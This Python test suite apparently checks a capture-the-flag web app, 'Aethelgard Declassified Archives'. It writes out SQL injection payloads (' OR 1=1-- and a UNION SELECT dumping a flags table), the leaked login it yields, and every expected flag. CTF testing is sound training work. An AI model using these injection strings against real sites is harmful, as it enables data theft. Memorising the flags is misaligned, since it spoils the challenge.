"""Automated test suite for Aethelgard Declassified Archives CTF."""
import sys
from pathlib import Path
from starlette.testclient import TestClient

PROJECT_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(PROJECT_ROOT))

from app.main import app

client = TestClient(app)

def run_tests():
    print("=== STARTING AETHELGARD ARCHIVES CTF SUITE ===")
    
    # 1. Test Home Route & Flag 1 Header
    print("\n[1] Testing GET / & Reconnaissance Header (Flag 1)...")
    res = client.get("/")
    assert res.status_code == 200, f"Expected 200, got {res.status_code}"
    assert "AETHELGARD" in res.text
    assert "X-Archipelago-Node" in res.headers, "Header X-Archipelago-Node missing!"
    flag1 = res.headers["X-Archipelago-Node"]
    print(f"    [+] Found Flag 1 Header: {flag1}")
    assert "flag{4rch1p3l4g0_r3c0n_f1ng3rpr1nt_88a1}" in flag1
    
    # 2. Test robots.txt
    print("\n[2] Testing GET /robots.txt...")
    res = client.get("/robots.txt")
    assert res.status_code == 200
    assert "Disallow: /photos/" in res.text
    print("    [+] robots.txt contains expected hidden paths.")
    
    # 3. Test Flag 4 (Executive Coordinates & Leaked Memo)
    print("\n[3] Testing Archive Search for Flag 4...")
    res = client.get("/")
    assert res.status_code == 200
    assert "flag{pr1v4t3_m41l_c00rd1n4t3s_3xfl1tr4t3d_44b1}" in res.text
    assert "36.4523N" in res.text and "28.1876E" in res.text
    print("    [+] Leaked coordinates memo and Flag 4 confirmed.")
    
    # 4. Test Alternative 1: Classic ' OR 1=1-- Search Trick for Flag 2 & Credentials
    print("\n[4] Testing Classic ' OR 1=1-- Search Trick (Flag 2)...")
    res = client.get("/?q=' OR 1=1--")
    assert res.status_code == 200
    assert "FLAG 2:" in res.text
    assert "flag{sql1_3xtr4ct_v4nc3_cr3d3nt14ls_77d2}" in res.text
    assert "d.mercer" in res.text
    assert "telecom2019" in res.text
    print("    [+] ' OR 1=1-- successfully unlocked Flag 2 and credentials (d.mercer / telecom2019).")
    
    # 5. Test UNION SQLi as well (Backwards-compatible)
    print("\n[5] Testing Advanced UNION SQL Injection...")
    sqli_payload = "' UNION SELECT 1, 'flag', flag_name, flag_value, 'FLAG', '2026', 'admin' FROM system_flags--"
    res = client.get(f"/?q={sqli_payload}")
    assert res.status_code == 200
    assert "flag{sql1_3xtr4ct_v4nc3_cr3d3nt14ls_77d2}" in res.text
    print("    [+] UNION SELECT query successfully dumped flags.")

    # 6. Test /flights (Private Aviation Registry)
    print("\n[6] Testing GET /flights...")
    res = client.get("/flights")
    assert res.status_code == 200
    assert "N708AG" in res.text
    assert "Site Bravo Private Runway" in res.text
    print("    [+] Private aviation registry rendered.")

    # 7. Test /photos Locked Gate (Requires Username & Password)
    print("\n[7] Testing /photos locked gate without credentials...")
    res = client.get("/photos")
    assert res.status_code == 200
    assert "Clearance Required" in res.text or "Restricted Surveillance Vault" in res.text
    assert "Sign In to Access Vault" in res.text or "SIGN IN" in res.text
    print("    [+] Unauthenticated users are properly blocked from viewing photos.")

    # 8. Test Logging In and Unlocking /photos (Flag 5)
    print("\n[8] Testing /login and accessing /photos with credentials (Flag 5)...")
    login_res = client.post("/login", data={"username": "d.mercer", "password": "telecom2019", "next": "/photos"})
    assert login_res.status_code in (200, 302, 303)
    
    photos_res = client.get("/photos")
    assert photos_res.status_code == 200
    assert "Surveillance Vault" in photos_res.text
    assert "flag{cl4ss1f13d_fl1ght_m4n1f3st_v4ult_55f9}" in photos_res.text
    print("    [+] Logged-in user successfully unlocked photos gallery and retrieved Flag 5!")

    print("\n=======================================================")
    print(">>> ALL 8 CTF FUNCTIONAL & SECURITY TESTS PASSED! <<<")
    print("=======================================================")

if __name__ == "__main__":
    run_tests()
